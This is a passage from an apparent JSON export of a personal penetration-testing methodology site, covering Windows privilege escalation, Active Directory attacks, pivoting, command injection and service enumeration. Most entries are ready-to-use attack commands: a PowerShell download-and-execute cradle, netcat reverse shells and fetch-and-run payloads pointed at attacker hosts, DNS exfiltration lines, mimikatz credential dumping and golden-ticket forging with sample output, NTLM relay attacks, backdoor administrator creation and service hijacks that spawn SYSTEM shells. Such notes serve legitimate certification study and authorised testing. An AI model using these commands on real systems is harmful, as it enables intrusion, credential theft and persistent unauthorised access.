\"IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/shell.ps1')\"\niwr -Uri 0.0.0.0/file -OutFile file.ps1 \n Web browser available? \u2192 Navigate to the file and download it. FROM BOX:",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Windows acd1564e996040a197e419e34d5d2dbf.html"
  },
  {
    "title": "Initial Enumeration",
    "body": "Initial Enumeration https://sirensecurity.io/blog/windows-privilege-escalation-resources/ fuzzysecurity  https://www.fuzzysecurity.com/tutorials/16.html Absolomb Windows Privilege Escalation Guide -  https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation Sushant 747's Guide (Country dependant - may need VPN) -  https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html System integrity process: SYSTEM rights High integrity process: administrative rights Medium integrity process: standard user rights Low integrity process: very restricted rights often used in\nsandboxed processes Methodology: Windows:   https://sirensecurity.io/blog/windows-privilege-escalation-resources/ Again look in a bunch of directories, this has found the way a lot of times.\nLook in C:\\ (any backup directory or something odd?), C:\\Program Files\n& Program Files (x86) (for the non-windows folders, look up any priv esc vulnerabilities with them?), C:\\Users, C:\\Windows\\Temp wmic service get name,startname, this will list services, I usually skim\nthrough this quick and look at any non windows ones. Specifically the\nbinary path, either if its unquoted or if you have write access to the\ndirectory of the binary. winpeas, make note of the section that tells you what directories are writeable by you. \n System Enumeration: systeminfo\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\nsysinfo (meterpreter) \n Looking at patches hot fixes: wmic qfe\nwmic qfe get Caption,Description,HotFixID,InstalledOn\nwmi product get name, version, vendor Listing drives: wmic logicaldisk\nlist drives\nwmic logicaldisk get caption,description,providername \n User Enumeration: \n name whoami priv whoami /priv groups whoami /groups \n info on users net user <user>\nnet user domain\nnet user\n#change password\nnet user <user> <password> local groups net localgroups\nnet localgroup <group?> \n Network Enumeration: ip config ipconfig (/all) arp table arp -a routing table route print  netstat netstat -ano \n Password Hunting: findstr /si password *.txt *.ini *.config \n Firewall and AV Enumeration: service control sc query windefend\nsc queryex type= service Firewall settings: netsh advfirewall firewall dump\nnetsh firewall show state\nnetsh firewall show config\n#\nnetsh advfirewall show currentprofile\nnetsh advfirewall firewall show rule name=all Drivers: #powershell\ndriverquery /v\n#Powershell\npowershell\ndriverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object\u2018Display Name\u2019, \u2018Start Mode\u2019, Path\nGet-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like \"*VMware*\"} Scheduled Tasks: schtasks /query /fo LIST /v\nPS> Get-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State\nPS> Get-ScheduledTask <task> | select -ExpandProperty Actions\n#Using accesschk.exe, note that you have the ability to write to this file:\nC:\\PrivEsc\\accesschk.exe /accepteula -quvw user C:\\DevTools\\task.ps1\n#Start a listener on Kali and then append a line to the C:\\DevTools\\task.ps1 which runs the reverse.exe executable you created:\necho C:\\PrivEsc\\reverse.exe >> C:\\DevTools\\setup.ps1 Running processes & services: tasklist /SVC Insecure GUI Apps: tasklist /V | findstr <task-run-by-admin>\n \n  History: #Powershell history\nC:/Users/user/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadliine/\nconsolehost_history.txt\n#cmd history\nC:/WINDOWS/System32/> doskey /history > c:/history.txt\n Add user: net user test password123! /add\nnet localgroup Administrators test /add\nnet localgroup \"Remote Desktop Users\" test /add\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nrdesktop 0.0.0.0 -u test -p password123! Change User Password: net user admin password!123 Another way: text.txt | net user pwn Password1! /add; net localgroup administrators pwn /add \n Find writable directories/files find / -type d -writable -print\nfind -type f -maxdepth 1 -writable\naccesschk.exe -uws \"Everyone\" \"C:/Program Files\"\n#powershell\nGet-ChildItem \"C:\\Program Files\" - Recurse | Get-ACL | ?{$_.AccessToString -match \"Everyone\\sAllow\\s\\sModify\"} Find writable directories \n Check app data for powershell history, clear text credentials Check recycle bins, saved browser passwords, saved program passwords. \n Evil Winrm: evil-winrm -i 0.0.0.0 -u pwn -p 'Password1!'\nevil-winrm -i 0.0.0.0 -u pwn -H <Hash>\ncrackmapexec winrm -u pwn -H <Hash> \n Enabling remote desktop: https://www.thewindowsclub.com/enable-remote-desktop-using-command-line #Command Line\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nnetsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes\n#Powershell\nSet-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server'-name \"fDenyTSConnections\" -Value 0\nEnable-NetFirewallRule -DisplayGroup \"Remote Desktop\" Using Remote Desktop: xfreerdp /v:0.0.0.0 /u:Username /p:Password /cert:ignore /workarea\nrdesktop 0.0.0.0 -u Username -p Password -d Domain.local\n HotPotato: powershell.exe -nop -ep bypass\nImport-Module C:\\Users\\User\\Desktop\\Tools\\Tater\\Tater.ps1\nInvoke-Tater -Trigger 1 -Command \"net localgroup administrators user /add\"\nnet localgroup administrators\n#OR\n.\\potato.exe -ip 0.0.0.0 -cmd \"C:\\reverse.exe\" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true \n Unmounted Disks: mountvol Web.config C:/inetpub/wwwroot/web.config\nC:/Windows/Microsoft.NET/Framework64/version/config/web.config\n#search for connectionString Putty Credentials: reg query HKEY_USER_CURRENT\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Initial Enumeration 000917ee49104392bb17c415ef54fab4.html"
  },
  {
    "title": "Initial AD Attack vectors",
    "body": "Initial AD Attack vectors LLMNR Poisioning: Used to identify hosts when DNS fails. Step 1: Responder MITM Listening (LLMNR Poisoning) python responder.py -l tun0 -rdw Step 2: an event occurs (wrong domain entered) Step 3: We can capture hashes Step 4: Crack hashes with Hashcat hashcat -m 5600 hashes.txt rockyou.txt \n Capturing NTLMv2 Hashes with Responder responder -I  <INTERFACE> -rdwv Then crack with hashcat hashscat64.exe -m 5600 hashes.txt rockyou.txt -O \n LLMNR Poisoning   Defense Disable LLMNR:  \n SMB Relay: relay hashes to different machines to try for access SMB signing is disabled relayed user cred must be admin on the machine impacket-ntlmrelayx -tf targets.txt -smb2support SAM file is shadow for windows nessus or nmap to check if SMB signing is off nmap --script=smb2-security-mode.nse -p445 <IP> responder.conf: http and smb OFF Run responder ntlmrelayx.py  -tf targets.txt -ismb2support -i i for interactive  smb shell created \n mitigation: \n Gaining shell access we can use psexec to get shell from SMB credentials: window/smb/psexec may take multiple attempts to succeed with different payloads. or  psexec.py  script smbexec or wmiexec \n IP v6 attacks: spooof dns for ipv6 since only ipv4 is supported MITM6: ntlmrelayx.py -6 -t ldaps://<IP> -wh fakewpad.marvel.local -l lootme \n delegate access\u2014 \n M itigation: \n Other Attack vectors: strategy Begin with MITM6 or Responder Run scans to generate traffic Look for websites in h\u00a5scope Look for default credentials on web logins Printers Jenkins Etc Think outside the box \n Extra: 53 is usually dual purpose DNS and DC, Ldap also a sign of DC kerbrute:   enumerate valid kerberos accts kerbrute userenum -dc <ip> -d <hostname.local> </userlist.txt> nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Initial AD Attack vectors 3f8ddac4ac264a679717e1b77f3d91a8.html"
  },
  {
    "title": "Capabilities",
    "body": "Capabilities Capabilities more secure than SUIDs... getcap -r / 2>/dev/null #example with ep available for python2,6\n#we just need to use the results to find a way to run as root\n/usr/bin/python2.6 -c 'import os; os.setuid(0); os.sytem(\"/bin/bash\")'\n#Or we can create a python file and run it....",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Capabilities de9da6af1ebd422b8bbb912c5296978a.html"
  },
  {
    "title": "WPA2 PSK",
    "body": "WPA2 PSK #TODO\nCapture traffic in monitor mode\n\naireplay-ng deauth attack\n\nCapture handshake\n\nCrack handshake with hashcat or aircrack-ng \n \n Capture Wireless passwords stored on Windows: #List:\nnetsh wlan show profiles\n#Extract password:\nnetsh wlan show profile name=\"WiFi\" key=clear\n#Export profile:\nhetsh wlan export profile name= \"Wireless\" folder=c:\\temp",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/WPA2 PSK b7374b26c7784f2dba3e908701a101e5.html"
  },
  {
    "title": "Pivoting",
    "body": "Pivoting https://pentest.coffee/pivoting-and-tunneling-for-oscp-and-beyond-cheat-sheet-3435d1d6022?gi=73e6ec6b1702 Pivot Tools: ssh: ssh -N -D 80 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@0.0.0.0 -p 22 ssh -N -D 80 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@0.0.0.0 -p 22 -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-rsa reverse :  sudo ssh -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -N -R 5555:127.0.0.1:5555 user@0.0.0.0 -p 2222 \n local port forward: forward an internal process (website?) running on a victim machine to be accessible to our kali machine. sudo ssh -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -N -L 9001:127.0.0.1:34023 user@0.0.0.0 -p 22\nssh -L 2375:localhost:2375 user@0.0.0.0  Dynamic: sudo ssh -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -N -D 8080 user@0.0.0.0 -p 2222 \n \n sshuttle: sshuttle -r root@0.0.1.1 10.10.10.0/24\n/home/me/.local/bin/sshuttle -e \"ssh options\" Plink: Plink Download -  https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html Putty Plink for port forwarding: plink.exe -l root -pw toor -R 445:127.0.0.1:445 <Attackers-IP>\n#edit ssh config for plink\nsudo gedit /etc/ssh/ssh_config\n#uncomment permitrootlogon and set to enabled^\ncmd.exe /c echo y | .\\plink.exe -R 8000:IP:80 kali@KALI_IP -i KEYFILE -N \n winexe: (execute commands on windows from kali with Plink) winexe -U Administrator%Password! //127.0.0.1 \"cmd.exe\" \n Chisel: attacker: sudo ./chisel server -p 8000 --reverse\nattacking: ./chisel client <ip>:<port> R:sock\n#edit proxy chains with socks5\nnano proxychains.conf\n#at bottom of file\nsocks5 127.0.0.1 8000\n\nproxychains4 nmap-sT <ip>\n\n---\n./chisel32 client 192.168.119.248:80 R:sock:22000\nsudo ./chiselarm64 server -p 80 --reverse \n Scanning & Enum: \n NMAP scanning: proxychains4 -q nmap -sC -sV -T5 -sT -Pn 10.1.1.68 Alternatively: upload binaries to the pivot point nc port scan pingsweep programs for host discovery \n Gobuster proxy: sudo proxychains4 gobuster dir -u http://0.0.0.0/ --proxy socks5://127.0.0.1:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 \n Burp Suite: #TODO \n Tunneling \n\nreverse:\n\nsudo ssh -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -N -R 5555:127.0.0.1:5555 [user@0.0.0.0] -p 2222\n\nlocal port forward: \n\nsudo ssh -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -N -L 9001:127.0.0.1:34023 [user@0.0.0.0] -p 2222\n\nDynamic\n\nsudo ssh -o \"UserKnownHostsFile=/dev/null\" -o \"StrictHostKeyChecking=no\" -N -D 8080 [user@0.0.0.0] -p 2222 proxy gobuster sudo proxychains4 gobuster dir -u http://0.0.0.0/ --proxy socks5://127.0.0.1:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -k",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Pivoting a97ad11c9a2b413da54d37cc609a4bd5.html"
  },
  {
    "title": "CVE-2019-1388",
    "body": "CVE-2019-1388 Zero Day Initiative CVE-2019-1388 -  https://www.youtube.com/watch?v=3BQKpPNlTSo Rapid7 CVE-2019-1388 -  https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388 \n Escalation through Internet explorer\u2026 - run exploit as administrator\n- View more info\n- Click issued by\n- should open IE in background\n- File saveas\n- go to cmd.exe and right click -> open\n- whoami",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/CVE-2019-1388 e90cc2b399a0429faed952c2ad42a801.html"
  },
  {
    "title": "AD Post Compromise Enumeration",
    "body": "AD Post Compromise Enumeration \n Powerview: #On Windows victim machine\npowershell -ep bypass\n. .\\Downloads\\PowerView.ps1\n#Enumerate Domain users\nGet-NetUser | select cn\n#Enumerate Domain groups\nGet-NetGroup -GroupName *admin*\n#Find Shares\nInvoke-ShareFinder\n#Get OS of network computers\nGet-NetComputer -fulldata | select operatingsystem\n#Further Enumeration with PowerView Cheatsheet... PowerView Cheatsheet: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 \n Bloodhound: start up neo4j neo4j console Username:  neo4j Password:  neo4j visit the server provided to change password Change password to - password #In your kali terminal...\nbloodhound sign in Now use ingester to get AD data from Windows machine Now on the Windows machine\u2026 Invoke-Bloodhound: download sharphound.ps1 powershell -ep bypass\n. .\\Downloads\\SharpHound.ps1\nInvoke-Bloodhound -CollectionMethod All -Domain <domain>.<local> -ZipFileName file.zip For SharpHound.exe: powershell -ep bypass\n.\\SharpHound.exe -c All -d <domain>.<local> --zipfilename file.zip Copy the data to your Linux machine upload the files click the hamburger you can find all Domain admins shortest path to a DA We want to compromise accounts with DAs logged in \n you need valid credentials\u2026 bloodhound-python -u 'user' -p 'password' -d domain.local -c all -ns 0.0.0.0 -gc 'attacktivedirec.spookysec.local' CME Bloodhound: crackmapexec ldap <ip_dc dc01.idk.crazy> -u user -p pass --bloodhound -ns 0.0.0.0 -c All \n M imikatz: can also invoke-mimikatz Dumps credentials stored in memory Can perform Credential dumping, PTH,Over-Pass-the-Hash, Pass-The-Ticket, Golden Ticket, Silver Ticket attacks. \n credential dumping privilege::debug\nsekurlsa::logonpasswords \n wdigest - stored pw in plain text, we can actually turn this on with mimikatz. \n lsadump::sam\nlsadump::lsa /patch - local security authority\nkerberos::list /export\nlsadump::secrets\nlsadump::cache\n\nsekurlsa::tickets \n Golden ticket attacks: Getting access to the TGS so we can write our own tickets whoami /user #grab sid, exclude last 5 num\nprivilege::debug\nlsadump::lsa /inject /name:krbtgt\n#grab ntlm hash and name then...\nkerberos::golden /User:myuser /domain:domain.local _sid:<sid> /krbtgt:<krbtgt> /ptt\nmisc::cmd\npsexec.exe\u3000\\\\DC01 cmd.exe\n------------------\n=====\nlsadump::lsa /inject /name:krbtgt\nkerberos::golden /User:Administrator /domain:domain.local _sid:<sid> /krbtgt:<krbtgt> /id:500 /ptt\nmisc::cmd Golden ticket gives us persistence EXAMPLE: #Dump the krbtgt Hash\nmimikatz # lsadump::lsa /inject /name:krbtgt \nDomain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 #we need this\n\nRID  : 000001f6 (502)\nUser : krbtgt #we need this\n\n * Primary\n    NTLM : 5508500012cc005cf7082a9a89ebdfdf #we need this\n    LM   :\n  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf\n    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf\n    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c\n\n#Create a Golden Ticket\nmimikatz # kerberos::golden /user:Administrator /domain:Controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf\nUser      : Administrator \nDomain    : Controller.local (CONTROLLER)\nSID       : S-1-5-21-849420856-2351964222-986696166\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt\nLifetime  : 3/5/2023 12:28:04 PM ; 3/2/2033 12:28:04 PM ; 3/2/2033 12:28:04 PM\n-> Ticket : ticket.kirbi\n\n * PAC generated \n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n\n#Use the Golden Ticket to access other machine\nmimikatz # misc::cmd \nPatch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6920D43B8\n\ndir \\\\Desktop-1\\c$\n\n DCSync: lsadump::dcsync /user:Administrator Sam the Admin: #TODO NoPac: crackmapexec smb IP -u user -p pass -M nopac \n GenericAll: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation #Adding computer to list\nimpacket-addcomputer \nimpacket-rbcd -f \n#request service ticket\nimpacket-getST",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/AD Post Compromise Enumeration 595e5368e5774e31942dbaceb84f0e3d.html"
  },
  {
    "title": "Command Injection",
    "body": "Command Injection Search for cmd= in URLS search for inputs that allow for system level commands to be executed\u2026 Follow this guide for checks:  https://www.cobalt.io/blog/a-pentesters-guide-to-command-injection \n Payloads: https://github.com/payloadbox/command-injection-payload-list Examples (Also URL encoding these payloads)\n#Regular\nproductid=1 & whoami #\n#Out of band\n& sleep 10 #\n#Output redirection\n& whoami > /valid/accessible/path.txt#\n#Blind, Out-of-band\n& nslookup <website> #\n#Blind, Out-of-band Data Exfiltration\n& nslookup `whoami`.<website> #\n& nslookup $(whoami).<website> #\n--------------------------------------------------------------------\nSpecial Characters\n&\n;\nNewline (0x0a or \\n)\n&&\n|\n||\ncommand `\n$(command )\n--------------------------------------------------------------------\nUseful Commands: Linux\nwhoami\nifconfig\nls\nuname -a\n--------------------------------------------------------------------\nUseful Commands: Windows\nwhoami\nipconfig\ndir\nver\n--------------------------------------------------------------------\nBoth Unix and Windows supported\nls||id; ls ||id; ls|| id; ls || id \nls|id; ls |id; ls| id; ls | id \nls&&id; ls &&id; ls&& id; ls && id \nls&id; ls &id; ls& id; ls & id \nls %0A id\n--------------------------------------------------------------------\nTime Delay Commands\n& ping -c 10 127.0.0.1 &\n--------------------------------------------------------------------\nRedirecting output\n& whoami > /var/www/images/output.txt &\n--------------------------------------------------------------------\nOOB (Out Of Band) Exploitation\n& nslookup attacker-server.com &\n& nslookup `whoami`.attacker-server.com &\n-------------------------------------------------------------------\nWAF bypasses\nvuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O \n/tmp/reverse.php %0a php /tmp/reverse.php\nvuln=127.0.0.1%0anohup nc -e /bin/bash <attacker-ip> <attacker-port>\nvuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload\n-------------------------------------------------------------------- \n OS Command Injections: \n Blind: Send sleep commands to test sleep 5 We can test for cmd injection using web server root directories: touch test.txt <location>\n\n/var/www/\n/var/www/html/\n/var/www/public/\n/var/www/static/\n/images/",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Command Injection 7fcb8bbaff6641fea477c37f4edbaefd.html"
  },
  {
    "title": "NFS (2049)",
    "body": "NFS (2049) Basic Enumeration showmount -e <ip>\nsudo mkdir /mnt/<mntDirectory>\nsudo mount -t nfs <ip>:</share> /mnt/<mntDirectory>\nshowmount -d <ip>\n#-o nolock\nmount -o rw,vers=2 <IP>:<share> <local_directory>\n#unmount\nsudo umount /mnt/<mntDirectory> nc -nv <ip> 2049\ntelnet <ip> 2049\nmountd \n nmap nmap -p 111 --script nfs* 0.0.0.0\nnmap -sV --script=nfs-showmount 0.0.0.0",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/NFS (2049) 8f0d0463d7a245ca9dba4a957bd0c6e8.html"
  },
  {
    "title": "5. Security Misconfiguration",
    "body": "5. Security Misconfiguration https://owasp.org/Top10/A05_2021-Security_Misconfiguration/ \n Examples: XXE (See page) CORS (See page) \n Prevention: Proper configuration Having multiple layers of security protection",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/5 Security Misconfiguration 73854bb969034aeb8ef832779e0359a5.html"
  },
  {
    "title": "SMB (139,445)",
    "body": "SMB (139,445) \n List SMB Shares smbclient -L <ip> -N SMB credential guessing: smb <Hostname> -u '' -p ''\nsmb <Hostname> -u 'guest' -p '' SMB Share enumeration: crackmapexec\u3000smb <Hostname> -u 'guest' -p '' --shares\n#Get all usernames on box. Read acces to IPC$ share \ncrackmapexec\u3000smb <Hostname> -u 'guest' -p '' --rid-brute \ncrackmapexec smb 0.0.0.0 -u 'guest' -p '' --users\n#download all files in share\nsmbmap -H 0.0.0.0 -R -A .\nenum4linux-ng <IP> smbclient //<IP>/<share> -U <user>\nsmb: \\> dir #view files\nmget * crackmapexec --spider-crawl?\n \n \n nmap ls -1 /usr/share/nmap/scripts/smb*\nnmap -v -p 139, 445 --script=smb-os-discovery 0.0.0.0\nnmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 0.0.0.0\nnmap --script=smb-* <target>",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/SMB (139,445) 045da874611b4cd5bafeacb43a1ca445.html"
  },
  {
    "title": "Tools",
    "body": "Tools \n winpeas \u2192 powerup \u2192 windows exploit suggester \u2192 metasploit suggester \n WinPEAS -  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS #enable winpeas CMD termninal color\nreg add HKCU/console /v VirtualTerminalLevel /t REG_DWORD /d 1 Windows PrivEsc Checklist -  https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation Sherlock -  https://github.com/rasta-mouse/Sherlock Watson -  https://github.com/rasta-mouse/Watson PowerUp -  https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc JAWS -  https://github.com/411Hall/JAWS Windows Exploit Suggester -  https://github.com/AonCyberLabs/Windows-Exploit-Suggester Metasploit Local Exploit Suggester -  https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/ Seatbelt -  https://github.com/GhostPack/Seatbelt SharpUp -  https://github.com/GhostPack/SharpUp \n \n Metasploit: run post/multi/recon/local_exploit_suggester Windows exploit suggester: ./windows-exploit-suggester.py --update\npip install xlrd --upgrade\n./windows-exploit-suggester.py --database <db> --systeminfo sysinfo.txt Install pip: curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py Windows Privesc Check: windows-privesc-check2.exe --dump -G",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Tools 508f4686dbc04a6ca1ee3e51082e0ad0.html"
  },
  {
    "title": "Directory Traversal",
    "body": "Directory Traversal We can use user controllable parameters to traverse unintended files  \n \n \n Finding Directory Traversal: \n White box: \n Black box: Map the Application Use payloads to test for DT \n Exploitation: regular: ../../../../../etc/passwd\n../../../../../windows/win.ini \n Absolute paths: /etc/passwd Traversal sequences stripped non-recursively: ....//....//...//etc/passwd URL Encoding, Double URL encoding: \n #requires specific starting path\n/var/www/images/../../../../etc/passwd Bypass file extension validation via null byte: #requires .png\n#only works with certain frameworks/configurations\n../../../etc/passwd%00.png ..%2ffile \n Prevention : avoid passing user supplied input to filesystem APIs Validate user input by comparing it to an allow list utilize file id  or file path referencing Utilize filesystem API to canonicalize the path and verify is starts with the expected base directory",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Directory Traversal ec5643ed622b474b9bb628833b5cb3be.html"
  },
  {
    "title": "Active Directory Overview",
    "body": "Active Directory Overview \n AD  \u2192  Manage windows domain networks. Phone book that stores information related to objects: computers, users, printers.  EX: User logging in on multiple computers on network from same login creds 95% of companies use it Authenticates using kerberos tickets \n Can be exploited without eveer attacking patchable exploits. We abuse features, trust, and components. \n Pythical AD Components: Domain Controller \u2192 host a copy of the AD DS.  Provides Authentication and authorization replicates updates to oher domain controllers in the domain and forest Allow admin access to manage user accounts and network resources AD DS Data store Contains password hashes for all users  only accisble through hte domain controll er processes and protocols consists of ntds.dit file stored by default in %SystemRoot%\\NTDS Logical components Schema - Rulebook for object created Domains administritive boundary for applying policies to group of objects. a replication boundary for replica. Managing objects Trees- a group of domains, share a contigous namepsace with ehe parnt domain can have 2 children. Forests - a collection of trees, share a common scheme. Share a common config partition/  \n Organizational Units OU - Containers that can contain users groups computers \n Trusts - Access of resources between things in other domains \n Objects -",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Active Directory Overview 22d002f1822547058ab4db22abb8acca.html"
  },
  {
    "title": "AWS",
    "body": "AWS IAM - who can access what - I We create groups and IAM users instead of logging in to AWS directly with root email acct \n Entry points to AWS \u2192 Code repos, social engineering, regular hacking, AWS services (EC2 services, Lambas, S3 buckets) \n We create IAM roles to give specific permissions and to connect services \n CLI login \u2192 User ID pw API login \u2192 secret key, API key \n Trust policy \u2192 which principles can assume a AWS role",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/AWS c8059661052947ed830fd719035e12c5.html"
  },
  {
    "title": "Service Permissions (Paths)",
    "body": "Service Permissions (Paths) Insecure Service Permissions: PS> Get-Service\nPS> Get-Service <service> | fl\nPS> Get-Service <service> | gm\nPS> Get-Service | where CanStop -eq $true\nPS> Get-Service | where CanPauseAndContinue -eq $true\n\nPS> Get-ChildItem \"Registry::HKLM\\SystemCurrentControlSet\\Services\\<service>\"\nPS> Get-ACL C:\\PathToService | fl\nPS> Start-Service <service> Binary Paths: Powerup method (easy): powershell -ep bypass\n. .\\PowerUp.ps1\nInvoke-AllChecks\n#finds service permissions must be able to start/stop service or restart machine #Use accesschk.exe to check the \"user\" account's permissions on the service:\n.\\accesschk.exe /accepteula -uwcqv user <service-found>\nAccesschk64.exe -uwcv Everyone *\nAccesschk64.exe -uwcv <service-found>\n\n#Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):\nsc qc <service-found>\n#Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:\nsc config <service-found> binpath= \"\\\"C:\\PrivEsc\\reverse.exe\\\"\"\n#OR\nsc config <service-found> binpath= \"net localgroup administrators user /add\"\n\nsc query <service-found>\nsc start <service-found>\nnet localgroup administrators \n Unquoted Service Paths: #Query the \"unquotedsvc\" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.\nsc qc unquotedsvc\n#Using accesschk.exe, note that the BUILTIN\\Users group is allowed to write to the C:\\Program Files\\Unquoted Path Service\\ directory:\nC:\\PrivEsc\\accesschk.exe /accepteula -uwdq \"C:\\Program Files\\Unquoted Path Service\\\"\n#Copy the reverse.exe executable you created to this directory and rename it Common.exe:\ncopy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\Unquoted Path Service\\Common.exe\"\n#Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:\nnet start unquotedsvc Powerup method (easy): powershell -ep bypass\n. .\\PowerUp.ps1\nInvoke-AllChecks\n#finds unqouted services \n Once found add a malicious executable where the cut off service exists for it to be run\u2026 restart program/machine\u2026 \n \n Weak Registry Permissions: #Query the \"regsvc\" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).\nsc qc regsvc\n#Using accesschk.exe, note that the registry entry for the regsvc service is writable by the \"NT AUTHORITY\\INTERACTIVE\" group (essentially all logged-on users):\nC:\\PrivEsc\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\regsvc\n#Overwrite the ImagePath registry key to point to the reverse.exe executable you created:\nreg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f\n#Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:\nnet start regsvc\n\n===\n#modifiable registry permissions found on winpeas\npowershell -exec bypass\nGet-Acl HKLM:\\System\\CurrentControlSet\\Services\\regsvc # the registry found\n.\\accesschk.exe /accepteula -uwcqv HKLM:\\System\\CurrentControlSet\\Services\\regsvc\n.\\accesschk.exe /accepteula -uwcqv user regsvc\nreg query HKLM:\\System\\CurrentControlSet\\Services\\regsvc\nreg add HKLM:\\System\\CurrentControlSet\\Services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\reverse.exe /f\nnet start regsvc \n Insecure Service Executables: #Query the \"filepermsvc\" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).\nsc qc filepermsvc\n#Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:\nC:\\PrivEsc\\accesschk.exe /accepteula -quvw \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"\n#Copy the reverse.exe executable you created and replace the filepermservice.exe with it:\ncopy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" /Y\n#Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:\nnet start filepermsvc",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Service Permissions (Paths) fb35617e95ee409da517c3e3303a9456.html"
  },
  {
    "title": "POP3 (110)",
